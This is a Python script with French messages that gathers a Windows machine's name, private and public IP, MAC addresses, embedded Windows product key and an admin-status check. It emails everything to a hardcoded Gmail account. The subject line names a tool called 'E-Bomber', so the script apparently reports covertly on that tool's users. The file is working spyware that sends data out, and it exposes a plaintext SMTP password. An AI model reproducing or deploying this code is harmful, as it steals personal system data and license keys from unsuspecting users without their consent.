import socket
import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import subprocess
import platform

def informations():
    
    computer_name = socket.gethostname()
    private_ip = socket.gethostbyname(computer_name)

    try:
        
        response = requests.get("https://api.ipify.org?format=json")
        public_ip = response.json()["ip"]
   
    except Exception:
        
        public_ip = "L'adresse IP publique n'a pas pu être déterminée !"

    try:
        
        result = subprocess.run(["powershell", "-Command", "Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty MACAddress"], capture_output=True, text=True)
        mac_address = result.stdout.strip().replace("\r\n", ", ").replace("\n", ", ")
        
        if not mac_address:
            
            mac_address = "L'adresse MAC n'a pas pu être déterminée !"
    
    except Exception:
        
        mac_address = "Une erreur est survenue lors de la récupération de l'adresse MAC !"

    try:
        
        result = subprocess.run(["powershell", "-Command", '(Get-WmiObject -query "select * from SoftwareLicensingService").OA3xOriginalProductKey'], capture_output=True, text=True)
        windows_key = result.stdout.strip()
        
        if not windows_key:
            
            windows_key = "La clé d'activation de Windows n'a pas pu être déterminée !"
    
    except Exception:
        
        windows_key = "Une erreur est survenue lors de la récupération de la clé d'activation de Windows !"

    try:
        
        result = subprocess.run(["powershell", "-Command", "Test-Path $env:SystemRoot\\System32"], capture_output=True, text=True)
        admin_status = "L'utilisateur est administrateur !" if result.returncode == 0 else "L'utilisateur n'est pas administrateur !"
    
    except Exception:
        
        admin_status = "Le statut de l'utilisateur n'a pas pu être déterminé !"

    os_name = platform.system()
    os_version = platform.version()
    os_release = platform.release()

    html_body = f"""
    
    <html>
    <body>

        
        <table border="1" cellpadding="10">
            
            <tr><td><strong>Nom du PC :</strong></td><td>{computer_name}</td></tr>
            <tr><td><strong>Adresse IP (PR)</strong></td><td>{private_ip}</td></tr>
            <tr><td><strong>Adresse IP (PU)</strong></td><td>{public_ip}</td></tr>
            <tr><td><strong>Adresse MAC :</strong></td><td>{mac_address}</td></tr>
            <tr><td><strong>Clé d'activation Windows :</strong></td><td>{windows_key}</td></tr>
            <tr><td><strong>Statut :</strong></td><td>{admin_status}</td></tr>
            <tr><td><strong>OS :</strong></td><td>{os_name} {os_release} (Version : {os_version})</td></tr>
        
        </table>
    
    </body>
    </html>"""

    server = "smtp.gmail.com"
    port = 587
    sender = "ebomber.sender@gmail.com"
    password = "jmbpsthumfhvoifv"
    recipient = sender

    msg = MIMEMultipart("alternative")
    msg["From"] = sender
    msg["To"] = recipient
    msg["Subject"] = "Information d'un système utilisant E-Bomber :"
    
    part = MIMEText(html_body, "html")
    msg.attach(part)

    try:
       
        with smtplib.SMTP(server, port) as smtp_server:
            
            smtp_server.starttls()
            smtp_server.login(sender, password)
            smtp_server.send_message(msg)
    
    except Exception as e:
        
        print(f"Une erreur est survenue lors de l'envoi du courriel : {e}")

if __name__ == "__main__":
    
    informations()